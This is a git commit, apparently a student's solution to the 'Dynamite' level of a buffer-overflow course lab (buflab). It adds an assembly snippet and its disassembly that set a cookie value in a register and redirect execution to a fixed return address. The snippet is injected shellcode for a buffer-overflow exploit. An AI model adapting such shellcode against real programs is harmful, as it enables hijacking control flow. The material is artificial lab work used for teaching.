eb7bf7c180e5d49eee7b1a7db915501edb8765aa
shahirg <shahir13579@gmail.com>
2021-05-09 01:55:43 -0400

    exploit 3 files

---
+++ Final/buflab_handout/asm_Dynamite.d
@@ -0,0 +1,10 @@
+
+asm_Dynamite.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:	b8 64 dc e6 4a       	mov    $0x4ae6dc64,%eax
+   5:	68 93 8c 04 08       	push   $0x8048c93
+   a:	c3                   	ret    
---
+++ Final/buflab_handout/asm_Dynamite.s
@@ -0,0 +1,3 @@
+movl $0x4ae6dc64, %eax
+pushl $0x08048c93
+ret
